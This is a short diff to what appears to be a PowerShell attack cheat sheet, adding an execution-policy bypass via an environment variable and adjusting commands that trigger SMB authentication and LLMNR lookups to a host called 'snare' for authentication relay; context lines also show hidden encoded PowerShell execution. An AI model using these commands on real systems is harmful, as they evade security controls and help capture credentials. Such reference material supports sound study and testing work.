@@ -88,12 +88,14 @@ C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
 
 ```
 PS C:\> Set-ExecutionPolicy Bypass -Scope <CurrentUser | Process> [-File C:\path\to\file.ps1
+
+PS C:\> $env:PSExecutionPolicyPreference="bypass"
 ```
 
 Execute cmdlet to perform SMB authentication relay.
 
 ```
-C:\> Get-ChildItem \\snare\share
+PS C:\> Get-ChildItem \\snare\share
 
 PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
 ```
